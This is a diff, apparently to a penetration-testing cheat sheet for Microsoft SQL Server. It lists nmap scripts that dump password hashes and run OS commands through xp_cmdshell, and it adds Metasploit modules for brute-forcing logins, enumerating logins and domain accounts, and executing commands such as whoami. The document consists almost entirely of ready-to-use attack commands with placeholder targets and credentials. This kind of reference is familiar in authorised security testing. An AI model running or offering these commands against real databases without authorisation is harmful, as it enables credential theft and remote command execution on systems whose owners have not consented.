@@ -9,3 +9,36 @@ nmap <IP> -p 1433 --script ms-sql-query --script-args mssql.username=<username>,
 nmap <IP> -p 1433 --script ms-sql-dump-hashes --script-args mssql.username=<username>,mssql.password=<password>
 nmap <IP> -p 1433 --script ms-sql-xp-cmdshell --script-args mssql.username=<username>,mssql.password=<password>,ms-sql-xp-cmdshell.cmd="ipconfig"
 
+msfconsole:
+-----------
+
+> auxiliary/scanner/mssql_login
+  > setg RHOSTS
+  > set user_file
+  > set pass_file
+  > set verbose false
+  
+> auxiliary/admin/mssql/mssql_enum
+  > setg RHOSTS
+  > set user_file
+  > set pass_file
+  > set verbose false
+  
+> auxiliary/admin/mssql/mssql_enum_logins
+  > setg RHOSTS
+  > set user_file
+  > set pass_file
+  > set verbose false
+  
+> auxiliary/admin/mssql/mssql_exec
+  > set cmd whoami
+  > setg RHOSTS
+  > set user_file
+  > set pass_file
+  > set verbose false
+  
+> auxiliary/admin/mssql/mssql_enum_domain_accounts
+  > setg RHOSTS
+  > set user_file
+  > set pass_file
+  > set verbose false
